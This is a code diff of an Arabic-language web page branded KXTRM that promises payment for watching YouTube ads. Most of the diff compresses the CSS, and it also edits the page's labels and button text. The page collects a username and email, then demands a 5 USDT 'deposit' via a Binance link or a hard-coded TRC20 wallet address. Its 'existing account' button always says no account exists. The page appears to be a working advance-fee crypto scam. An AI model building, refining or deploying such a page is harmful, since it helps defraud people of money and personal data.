@@ -4,229 +4,58 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>KXTRM - الدفع والاشتراك</title>
-    
-    <!-- جلب خط Cairo الاحترافي من جوجل -->
     <link rel="preconnect" href="https://googleapis.com">
     <link rel="preconnect" href="https://gstatic.com" crossorigin>
     <link href="https://googleapis.com" rel="stylesheet">
-
     <style>
-        body { 
-            font-family: 'Cairo', sans-serif; 
-            background-color: #000000 !important; 
-            color: #ffffff; 
-            text-align: center; 
-            padding: 40px 20px; 
-            margin: 0; 
-        }
-        .card { 
-            background: #000000 !important; 
-            padding: 35px 25px; 
-            border-radius: 20px; 
-            display: inline-block; 
-            width: 100%; 
-            max-width: 380px; 
-            box-shadow: 0 10px 25px rgba(0,0,0,0.5); 
-            border: 1px solid #3d2f75; 
-        }
-        .brand { 
-            font-family: 'Cairo', sans-serif;
-            font-size: 34px; 
-            font-weight: 900; 
-            margin-bottom: 10px; 
-            letter-spacing: 1px;
-        }
-        .subtitle { 
-            color: #a29bfe; 
-            font-size: 15px; 
-            font-weight: 600;
-            margin-bottom: 20px; 
-        }
-        .amount-tag {
-            background-color: #1e1b4b;
-            border: 1px dashed #6c5ce7;
-            padding: 12px;
-            border-radius: 10px;
-            font-size: 18px;
-            font-weight: 700;
-            color: #00ffcc;
-            margin-bottom: 25px;
-        }
-        .input-group { 
-            margin-bottom: 20px; 
-            text-align: right; 
-        }
-        
-        label { 
-            display: block; 
-            margin-bottom: 10px; 
-            color: #ffffff; 
-            font-size: 16px; 
-            font-weight: 700; 
-        }
-        
-        input[type="text"] { 
-            font-family: 'Cairo', sans-serif;
-            width: 100%; 
-            padding: 12px; 
-            border-radius: 10px; 
-            border: 1px solid #4a3f85; 
-            background-color: #141026; 
-            color: #fff; 
-            box-sizing: border-box; 
-            font-size: 15px; 
-        }
-        
-        @keyframes greenGlowPulse {
-            0% { background-color: #00b894; box-shadow: 0 0 10px rgba(0, 184, 148, 0.5); }
-            50% { background-color: #00ffa3; box-shadow: 0 0 25px rgba(0, 255, 163, 0.9); }
-            100% { background-color: #00b894; box-shadow: 0 0 10px rgba(0, 184, 148, 0.5); }
-        }
-
-        .submit-btn-pulse {
-            font-family: 'Cairo', sans-serif; 
-            width: 100%; 
-            padding: 14px; 
-            color: #000000; 
-            border: none; 
-            border-radius: 8px; 
-            font-weight: bold; 
-            font-size: 16px; 
-            margin-top: 20px; 
-            cursor: pointer;
-            box-sizing: border-box;
-            animation: greenGlowPulse 2s infinite ease-in-out;
-            transition: 0.2s;
-        }
+        body { font-family: 'Cairo', sans-serif; background-color: #000000 !important; color: #ffffff; text-align: center; padding: 40px 20px; margin: 0; }
+        .card { background: #000000 !important; padding: 35px 25px; border-radius: 20px; display: inline-block; width: 100%; max-width: 380px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); border: 1px solid #3d2f75; }
+        .brand { font-family: 'Cairo', sans-serif; font-size: 34px; font-weight: 900; margin-bottom: 10px; letter-spacing: 1px; }
+        .subtitle { color: #a29bfe; font-size: 15px; font-weight: 600; margin-bottom: 20px; }
+        .amount-tag { background-color: #1e1b4b; border: 1px dashed #6c5ce7; padding: 12px; border-radius: 10px; font-size: 18px; font-weight: 700; color: #00ffcc; margin-bottom: 25px; }
+        .input-group { margin-bottom: 20px; text-align: right; }
+        label { display: block; margin-bottom: 10px; color: #ffffff; font-size: 16px; font-weight: 700; }
+        input[type="text"] { font-family: 'Cairo', sans-serif; width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #4a3f85; background-color: #141026; color: #fff; box-sizing: border-box; font-size: 15px; }
+        @keyframes greenGlowPulse { 0% { background-color: #00b894; box-shadow: 0 0 10px rgba(0, 184, 148, 0.5); } 50% { background-color: #00ffa3; box-shadow: 0 0 25px rgba(0, 255, 163, 0.9); } 100% { background-color: #00b894; box-shadow: 0 0 10px rgba(0, 184, 148, 0.5); } }
+        .submit-btn-pulse { font-family: 'Cairo', sans-serif; width: 100%; padding: 14px; color: #000000; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; margin-top: 20px; cursor: pointer; box-sizing: border-box; animation: greenGlowPulse 2s infinite ease-in-out; transition: 0.2s; }
         .submit-btn-pulse:hover { transform: scale(1.02); }
-        
-        .binance-btn-final {
-            font-family: 'Cairo', sans-serif;
-            width: 100%; 
-            padding: 14px; 
-            color: #000; 
-            border: none; 
-            border-radius: 8px; 
-            font-weight: bold; 
-            font-size: 15px; 
-            cursor: pointer; 
-            display: block; 
-            text-decoration: none; 
-            margin-bottom: 12px;
-            box-sizing: border-box;
-            animation: greenGlowPulse 2s infinite ease-in-out;
-            transition: 0.2s;
-        }
+        .binance-btn-final { font-family: 'Cairo', sans-serif; width: 100%; padding: 14px; color: #000; border: none; border-radius: 8px; font-weight: bold; font-size: 15px; cursor: pointer; display: block; text-decoration: none; margin-bottom: 12px; box-sizing: border-box; animation: greenGlowPulse 2s infinite ease-in-out; transition: 0.2s; }
         .binance-btn-final:hover { transform: scale(1.02); }
-
-        .manual-deposit-box {
-            margin-top: 25px; 
-            padding: 15px; 
-            border: 2px dashed #6c5ce7; 
-            border-radius: 8px; 
-            background-color: #ffffff; 
-            text-align: center;
-            box-shadow: 0 5px 15px rgba(255,255,255,0.05);
-        }
-
-        .crypto-address-container {
-            font-family: 'Cairo', sans-serif;
-            width: 100%; 
-            padding: 12px 10px; 
-            text-align: center; 
-            background: #f1f2f6; 
-            color: #2f3542; 
-            border: 1px solid #ced6e0; 
-            border-radius: 6px; 
-            font-size: 14px; 
-            font-weight: bold;
-            direction: ltr; 
-            white-space: normal; 
-            word-break: break-all; 
-            box-sizing: border-box;
-            margin-top: 5px;
-        }
-
-        .check-account-btn {
-            font-family: 'Cairo', sans-serif;
-            width: 100%;
-            padding: 12px;
-            background: transparent;
-            color: #a29bfe;
-            border: 1px dashed #4a3f85; 
-            border-radius: 8px;
-            font-weight: bold;
-            font-size: 14px;
-            margin-top: 15px; 
-            margin-bottom: 5px; 
-            cursor: pointer;
-            transition: 0.3s;
-        }
-        .check-account-btn:hover {
-            background: #1d1836;
-            color: #fff;
-            border-color: #6c5ce7;
-        }
-
-        .footer-info-box {
-            margin-top: 30px;
-            font-family: sans-serif;
-            font-size: 11px;
-            color: #ffffff;
-            line-height: 1.6;
-            font-weight: bold;
-        }
-        .footer-info-box .brand-line {
-            font-size: 20px;
-            margin-bottom: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-        .footer-info-box .highlight-red {
-            color: #ff3838;
-            font-weight: 900;
-        }
+        .manual-deposit-box { margin-top: 25px; padding: 15px; border: 2px dashed #6c5ce7; border-radius: 8px; background-color: #ffffff; text-align: center; box-shadow: 0 5px 15px rgba(255,255,255,0.05); }
+        .crypto-address-container { font-family: 'Cairo', sans-serif; width: 100%; padding: 12px 10px; text-align: center; background: #f1f2f6; color: #2f3542; border: 1px solid #ced6e0; border-radius: 6px; font-size: 14px; font-weight: bold; direction: ltr; white-space: normal; word-break: break-all; box-sizing: border-box; margin-top: 5px; }
+        .check-account-btn { font-family: 'Cairo', sans-serif; width: 100%; padding: 12px; background: transparent; color: #a29bfe; border: 1px dashed #4a3f85; border-radius: 8px; font-weight: bold; font-size: 14px; margin-top: 15px; margin-bottom: 5px; cursor: pointer; transition: 0.3s; }
+        .check-account-btn:hover { background: #1d1836; color: #fff; border-color: #6c5ce7; }
+        .footer-info-box { margin-top: 30px; font-family: sans-serif; font-size: 11px; color: #ffffff; line-height: 1.6; font-weight: bold; }
+        .footer-info-box .brand-line { font-size: 20px; margin-bottom: 10px; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .footer-info-box .highlight-red { color: #ff3838; font-weight: 900; }
     </style>
 </head>
 <body>
     <div class="card">
         <div class="brand">KXTRM</div>
         <div class="subtitle">إنشاء حساب جديد للمتابعة وتشغيل الخدمة</div>
-        
         <div class="amount-tag">الإيداع: 5.00 USDT</div>
-
         <form id="paymentForm">
             <div id="step1">
                 <div class="input-group">
                     <label for="displayname">اسم المستخدم</label>
-                    <input type="text" id="displayname" required placeholder="اكتب اسم المستخدم هنا" style="font-family: 'Cairo', sans-serif; width: 100%; padding: 12px; background: #fff; color: #000; border: none; border-radius: 8px; margin-top: 8px; box-sizing: border-box;">
+                    <input type="text" id="displayname" required placeholder="اكتب اسم المستخدم هنا">
                 </div>
-
                 <div class="input-group">
-                    <label for="username">إنشاء حساب</label>
-                    <input type="text" id="username" required placeholder="example@gmail.com" style="font-family: 'Cairo', sans-serif; width: 100%; padding: 12px; background: #fff; color: #000; border: none; border-radius: 8px; margin-top: 8px; box-sizing: border-box;">
+                    <label for="username">البريد الإلكتروني</label>
+                    <input type="text" id="username" required placeholder="example@gmail.com">
                 </div>
-                
-                <button type="button" onclick="goToStep2()" class="submit-btn-pulse">متابعة إلى الإيداع</button>
+                <button type="button" onclick="goToStep2()" class="submit-btn-pulse">تسجيل دخول</button>
                 <button type="button" onclick="alertNoAccount()" class="check-account-btn">هل لديك حساب مسبقاً؟</button>
-                
                 <div class="footer-info-box">
-                    <div class="brand-line">
-                        <span>🌐 KXTRM 🟢</span>
-                    </div>
+                    <div class="brand-line"><span>🌐 KXTRM 🟢</span></div>
                     <p>A PLATFORM TO PROVIDE COMPREHENSIVE SUPPORT<br>WHEN WATCHING YOUTUBE ADS</p>
                     <p>YOU WILL RECEIVE THE MONEY THROUGH YOUR ACCOUNT</p>
                     <p class="highlight-red">PLEASE DEPOSIT $5. GO TO PAGE.</p>
                 </div>
             </div>
-
             <div id="step2" style="display: none; margin-top: 15px;">
-                <a href="https://binance.com" class="binance-btn-final">
-                    ⚡ الدفع عبر بايننس طلب دفع
-                </a>
-
+                <a href="https://binance.com" class="binance-btn-final">⚡ الدفع عبر بايننس طلب دفع</a>
                 <div class="manual-deposit-box">
                     <p style="font-size: 14px; margin-bottom: 10px; color: #2f3542;">أو للإيداع من OKX وباقي المحافظ (شبكة TRC20):</p>
                     <div id="cryptoAddress" class="crypto-address-container">THJN4XBKxbZNYsw7YAHmNiZSupn3kVEDFP</div>
@@ -235,36 +64,20 @@
             </div>
         </form>
     </div>
-
     <script>
         function goToStep2() {
             var emailInput = document.getElementById('username');
             var nameInput = document.getElementById('displayname');
-            
             if (emailInput.checkValidity() && emailInput.value !== "" && nameInput.value.trim() !== "") {
                 document.getElementById('step1').style.display = 'none';
                 document.getElementById('step2').style.display = 'block';
-            } else {
-                alert('يرجى ملء حقل اسم المستخدم وإنشاء الحساب أولاً بشكل صحيح.');
-            }
+            } else { alert('يرجى ملء حقل اسم المستخدم والبريد الإلكتروني أولاً بشكل صحيح.'); }
         }
-
-        function alertNoAccount() {
-            alert('لا يوجد حساب مسجل مسبقاً بهذا البريد، يرجى إنشاء حساب جديد.');
-        }
-
+        function alertNoAccount() { alert('لا يوجد حساب مسجل مسبقاً بهذا البريد، يرجى إنشاء حساب جديد.'); }
         function copyWalletAddress() {
             var addressText = document.getElementById('cryptoAddress').innerText;
-            navigator.clipboard.writeText(addressText).then(function() {
-                alert('تم نسخ عنوان المحفظة بنجاح!');
-            }, function() {
-                var textarea = document.createElement("textarea");
-                textarea.value = addressText;
-                document.body.appendChild(textarea);
-                textarea.select();
-                document.execCommand("copy");
-                document.body.removeChild(textarea);
-                alert('تم نسخ عنوان المحفظة بنجاح!');
+            navigator.clipboard.writeText(addressText).then(function() { alert('تم نسخ عنوان المحفظة بنجاح!'); }, function() {
+                var textarea = document.createElement("textarea"); textarea.value = addressText; document.body.appendChild(textarea); textarea.select(); document.execCommand("copy"); document.body.removeChild(textarea); alert('تم نسخ عنوان المحفظة بنجاح!');
             });
         }
     </script>
